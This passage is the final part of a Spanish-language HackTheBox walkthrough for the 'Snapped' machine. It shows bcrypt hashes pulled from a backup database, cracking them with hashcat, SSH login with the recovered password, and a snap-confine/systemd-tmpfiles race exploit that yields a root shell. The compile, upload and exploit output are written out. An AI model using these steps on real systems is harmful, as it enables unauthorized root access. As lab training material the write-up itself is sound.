+</span></span><span class=line><span class=cl><span class=o>[*]</span> <span class=no>Main</span> <span class=n>archive</span> <span class=ss>contains</span><span class=p>:</span> <span class=o>[</span><span class=s1>&#39;hash_info.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;nginx-ui.zip&#39;</span><span class=p>,</span> <span class=s1>&#39;nginx.zip&#39;</span><span class=o>]</span>
+</span></span><span class=line><span class=cl><span class=o>[*]</span> <span class=no>Decrypting</span> <span class=n>hash_info</span><span class=o>.</span><span class=n>txt</span><span class=o>...</span>
+</span></span><span class=line><span class=cl>    <span class=err>→</span> <span class=no>Saved</span> <span class=n>to</span> <span class=n>backup_extracted</span><span class=o>/</span><span class=n>hash_info</span><span class=o>.</span><span class=n>txt</span><span class=o>.</span><span class=n>decrypted</span> <span class=p>(</span><span class=mi>199</span> <span class=n>bytes</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=o>[*]</span> <span class=no>Decrypting</span> <span class=n>nginx</span><span class=o>-</span><span class=n>ui</span><span class=o>.</span><span class=n>zip</span><span class=o>...</span>
+</span></span><span class=line><span class=cl>    <span class=err>→</span> <span class=no>Saved</span> <span class=n>to</span> <span class=n>backup_extracted</span><span class=o>/</span><span class=n>nginx</span><span class=o>-</span><span class=n>ui_decrypted</span><span class=o>.</span><span class=n>zip</span> <span class=p>(</span><span class=mi>7778</span> <span class=n>bytes</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=err>→</span> <span class=no>Extracted</span> <span class=mi>2</span> <span class=n>files</span> <span class=n>to</span> <span class=n>backup_extracted</span><span class=o>/</span><span class=n>nginx</span><span class=o>-</span><span class=n>ui</span>
+</span></span><span class=line><span class=cl><span class=o>[*]</span> <span class=no>Decrypting</span> <span class=n>nginx</span><span class=o>.</span><span class=n>zip</span><span class=o>...</span>
+</span></span><span class=line><span class=cl>    <span class=err>→</span> <span class=no>Saved</span> <span class=n>to</span> <span class=n>backup_extracted</span><span class=o>/</span><span class=n>nginx_decrypted</span><span class=o>.</span><span class=n>zip</span> <span class=p>(</span><span class=mi>9936</span> <span class=n>bytes</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=err>→</span> <span class=no>Extracted</span> <span class=mi>22</span> <span class=n>files</span> <span class=n>to</span> <span class=n>backup_extracted</span><span class=o>/</span><span class=n>nginx</span></span></span></code></pre></div><p>Datos de integridad del archivo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>nginx-ui_hash: 394420319239a8526127bdb05faffecadf30d61bb7b66149d8ba262b7d2b1b63
+</span></span><span class=line><span class=cl>nginx_hash: a49bce754d148666390537c046c4fd5ee88365eb651a2fc0897e34089bd0c07f
+</span></span><span class=line><span class=cl>timestamp: 20260519-231816
+</span></span><span class=line><span class=cl>version: 2.3.2</span></span></code></pre></div><p>Del <code>database.db</code> extraído consultamos los hashes bcrypt de los usuarios:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=n>sqlite</span><span class=o>&gt;</span> <span class=nb>select</span> <span class=nb>name</span><span class=p>,</span><span class=n>password</span> <span class=n>from</span> <span class=n>users</span><span class=p>;</span></span></span></code></pre></div><h4 id=credentialstxt>credentials.txt
+<a class=heading-link href=#credentialstxt><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>admin / $2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm
+</span></span><span class=line><span class=cl>jonathan / $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq</span></span></code></pre></div><p>Crackeamos los hashes con hashcat y rockyou:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>$</span> <span class=n>hashcat</span> <span class=o>-</span><span class=n>m</span> <span class=mi>3200</span> <span class=n>hashes</span><span class=o>.</span><span class=n>txt</span> <span class=sr>/usr/s</span><span class=n>hare</span><span class=o>/</span><span class=n>wordlists</span><span class=o>/</span><span class=n>rockyou</span><span class=o>.</span><span class=n>txt</span></span></span></code></pre></div><h4 id=credentialstxt-1>Credentials.txt
+<a class=heading-link href=#credentialstxt-1><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>jonathan / linkinpark</span></span></code></pre></div><p>Accedemos por SSH con las credenciales recuperadas:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>$</span> <span class=n>ssh</span> <span class=n>jonathan</span><span class=vi>@snapped</span><span class=o>.</span><span class=n>htb</span>
+</span></span><span class=line><span class=cl><span class=n>jonathan</span><span class=vi>@snapped</span><span class=ss>:~</span><span class=err>$</span> <span class=n>cat</span> <span class=n>user</span><span class=o>.</span><span class=n>txt</span>
+</span></span><span class=line><span class=cl><span class=mi>21e329</span><span class=n>f1958563926cb45f9f58bcd5e6</span></span></span></code></pre></div><h2 id=escalada-de-privilegios--cve-2026-3888>Escalada de privilegios — CVE-2026-3888
+<a class=heading-link href=#escalada-de-privilegios--cve-2026-3888><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><p>Una vez dentro, enumeramos binarios SUID:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>$</span> <span class=n>find</span> <span class=o>/</span> <span class=o>-</span><span class=n>perm</span> <span class=o>-</span><span class=mi>4000</span> <span class=mi>2</span><span class=o>&gt;</span><span class=sr>/dev/nu</span><span class=n>ll</span>
+</span></span><span class=line><span class=cl><span class=sr>/snap/sn</span><span class=n>apd</span><span class=o>/</span><span class=mi>21759</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>snapd</span><span class=o>/</span><span class=n>snap</span><span class=o>-</span><span class=n>confine</span></span></span></code></pre></div><p>Destaca un binario SUID poco habitual: <strong><code>snap-confine</code></strong> (snapd <strong>2.63</strong>). Revisamos timers del sistema:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>$</span> <span class=n>systemctl</span> <span class=n>list</span><span class=o>-</span><span class=n>timers</span>
+</span></span><span class=line><span class=cl><span class=n>systemd</span><span class=o>-</span><span class=n>tmpfiles</span><span class=o>-</span><span class=n>clean</span><span class=o>.</span><span class=n>timer</span> <span class=err>→</span> <span class=n>systemd</span><span class=o>-</span><span class=n>tmpfiles</span><span class=o>-</span><span class=n>clean</span><span class=o>.</span><span class=n>service</span> <span class=p>(</span><span class=n>activo</span> <span class=o>/</span> <span class=n>recurrente</span><span class=p>)</span></span></span></code></pre></div><p>Y los snaps instalados:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>$</span> <span class=n>snap</span> <span class=n>list</span>
+</span></span><span class=line><span class=cl><span class=no>Name</span>     <span class=no>Version</span>     <span class=no>Rev</span>    <span class=no>Tracking</span>         <span class=no>Publisher</span>
+</span></span><span class=line><span class=cl><span class=n>bare</span>     <span class=mi>1</span><span class=o>.</span><span class=mi>0</span>         <span class=mi>5</span>      <span class=n>latest</span><span class=o>/</span><span class=n>stable</span>    <span class=n>canonical</span><span class=err>✓</span>
+</span></span><span class=line><span class=cl><span class=n>core22</span>   <span class=mi>20240731</span>    <span class=mi>1564</span>   <span class=n>latest</span><span class=o>/</span><span class=n>stable</span>    <span class=n>canonical</span><span class=err>✓</span>
+</span></span><span class=line><span class=cl><span class=n>firefox</span>  <span class=mi>129</span><span class=o>.</span><span class=mi>0</span><span class=o>.</span><span class=mi>2</span><span class=o>-</span><span class=mi>1</span>   <span class=mi>4793</span>   <span class=n>latest</span><span class=o>/</span><span class=n>stable</span><span class=o>/</span><span class=err>…</span>  <span class=n>mozilla</span><span class=err>✓</span>
+</span></span><span class=line><span class=cl><span class=n>snapd</span>    <span class=mi>2</span><span class=o>.</span><span class=mi>63</span>        <span class=mi>21759</span>  <span class=n>latest</span><span class=o>/</span><span class=n>stable</span>    <span class=n>canonical</span><span class=err>✓</span></span></span></code></pre></div><p>La combinación de <code>snap-confine</code> (v2.63) y <code>systemd-tmpfiles</code> es vulnerable a una condición de carrera <strong>TOCTOU</strong>: permite envenenar el mount namespace e inyectar un objeto compartido <code>ld-linux</code> malicioso, ejecutando código arbitrario como <strong>root</strong>.</p><p>Compilamos el exploit en nuestra máquina atacante:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ gcc -O2 -static -o exploit exploit_suid.c
+</span></span><span class=line><span class=cl>$ gcc -nostdlib -static -Wl,--entry<span class=o>=</span>_start -o librootshell.so librootshell_suid.c</span></span></code></pre></div><p>Subimos los binarios al objetivo mediante la sesión C2 (Penelope SSH):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>upload CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE/exploit
+</span></span><span class=line><span class=cl>upload CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE/librootshell.so</span></span></code></pre></div><p>Ejecutamos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>$</span> <span class=o>.</span><span class=n>/</span><span class=n>exploit</span> <span class=n>librootshell</span><span class=o>.</span><span class=n>so</span>
+</span></span><span class=line><span class=cl><span class=o>[!]</span>   <span class=no>TRIGGER</span> <span class=err>—</span> <span class=n>swapping</span> <span class=n>directories</span><span class=o>...</span>
+</span></span><span class=line><span class=cl><span class=o>[+]</span>   <span class=no>SWAP</span> <span class=no>DONE</span> <span class=err>—</span> <span class=n>race</span> <span class=n>won!</span>
+</span></span><span class=line><span class=cl><span class=o>[*]</span>   <span class=n>ld</span><span class=o>-</span><span class=n>linux</span> <span class=k>in</span> <span class=ss>namespace</span><span class=p>:</span> <span class=ss>jonathan</span><span class=p>:</span><span class=n>jonathan</span> <span class=mi>755</span>
+</span></span><span class=line><span class=cl><span class=o>[+]</span>   <span class=no>Poisoned</span> <span class=n>namespace</span> <span class=ss>PID</span><span class=p>:</span> <span class=mi>4581</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span><span class=no>Phase</span> <span class=mi>5</span><span class=o>]</span> <span class=no>Injecting</span> <span class=n>payload</span> <span class=n>into</span> <span class=n>poisoned</span> <span class=n>namespace</span><span class=o>...</span>
+</span></span><span class=line><span class=cl><span class=o>[+]</span>   <span class=n>ld</span><span class=o>-</span><span class=n>linux</span> <span class=n>owned</span> <span class=n>by</span> <span class=n>uid</span> <span class=mi>1000</span> <span class=p>(</span><span class=n>attacker</span><span class=p>)</span><span class=o>.</span> <span class=no>Race</span> <span class=n>confirmed</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=o>[*]</span>   <span class=no>Planting</span> <span class=n>busybox</span><span class=o>...</span>
+</span></span><span class=line><span class=cl><span class=o>[*]</span>   <span class=no>Writing</span> <span class=n>escape</span> <span class=n>script</span> <span class=err>→</span> <span class=sr>/tmp/s</span><span class=n>h</span>
+</span></span><span class=line><span class=cl><span class=o>[*]</span>   <span class=no>Overwriting</span> <span class=n>ld</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>x86</span><span class=o>-</span><span class=mi>64</span><span class=o>.</span><span class=n>so</span><span class=o>.</span><span class=mi>2</span><span class=o>...</span>
+</span></span><span class=line><span class=cl><span class=o>[+]</span>   <span class=no>Payload</span> <span class=n>injected</span><span class=o>.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span><span class=no>Phase</span> <span class=mi>6</span><span class=o>]</span> <span class=no>Triggering</span> <span class=n>root</span> <span class=n>via</span> <span class=no>SUID</span> <span class=n>snap</span><span class=o>-</span><span class=n>confine</span><span class=o>...</span>
+</span></span><span class=line><span class=cl><span class=o>[*]</span>   <span class=n>snap</span><span class=o>-</span><span class=n>confine</span> <span class=err>→</span> <span class=n>snap</span><span class=o>-</span><span class=n>confine</span> <span class=p>(</span><span class=no>SUID</span> <span class=n>trigger</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=o>[*]</span>   <span class=no>Exit</span> <span class=ss>status</span><span class=p>:</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span><span class=no>Phase</span> <span class=mi>7</span><span class=o>]</span> <span class=no>Verifying</span><span class=o>...</span>
+</span></span><span class=line><span class=cl><span class=o>[+]</span> <span class=no>SUID</span> <span class=n>root</span> <span class=ss>bash</span><span class=p>:</span> <span class=sr>/var/sn</span><span class=n>ap</span><span class=o>/</span><span class=n>firefox</span><span class=o>/</span><span class=n>common</span><span class=o>/</span><span class=n>bash</span> <span class=p>(</span><span class=n>mode</span> <span class=mi>4755</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=o>[*]</span> <span class=no>Cleaning</span> <span class=n>up</span> <span class=n>background</span> <span class=n>processes</span><span class=o>...</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>================================================================</span>
+</span></span><span class=line><span class=cl>  <span class=no>ROOT</span> <span class=ss>SHELL</span><span class=p>:</span> <span class=sr>/var/sn</span><span class=n>ap</span><span class=o>/</span><span class=n>firefox</span><span class=o>/</span><span class=n>common</span><span class=o>/</span><span class=n>bash</span> <span class=o>-</span><span class=nb>p</span>
+</span></span><span class=line><span class=cl><span class=o>================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>bash</span><span class=o>-</span><span class=mi>5</span><span class=o>.</span><span class=mi>1</span><span class=c1>#</span></span></span></code></pre></div><p>Con privilegios de root obtenemos la flag final:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=n>root</span><span class=vi>@snapped</span><span class=ss>:~</span><span class=c1># cat /root/root.txt</span>
+</span></span><span class=line><span class=cl><span class=mi>80245140</span><span class=n>cb8cd4fe8c9a2cbbb12c4d8a</span></span></span></code></pre></div><p>Pwned!</p><p><img src=/images/gifs/party_raccoon.gif alt></p><hr></div><footer><section class=see-also><h3 id=también-ver-en-hackthebox>También ver en HackTheBox
+<a class=heading-link href=#tambi%c3%a9n-ver-en-hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><nav><ul><li><a href=/posts/fireflow/>FireFlow</a></li><li><a href=/posts/abducted/>Abducted</a></li><li><a href=/posts/variatype/>VariaType</a></li><li><a href=/posts/principal/>Principal</a></li><li><a href=/posts/cap/>Cap CTF</a></li></ul></nav></section></footer></article></section></div><footer class=footer><section class=container>©
+2019 -
+2026
+David León
+·
+Desarrollado por <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>
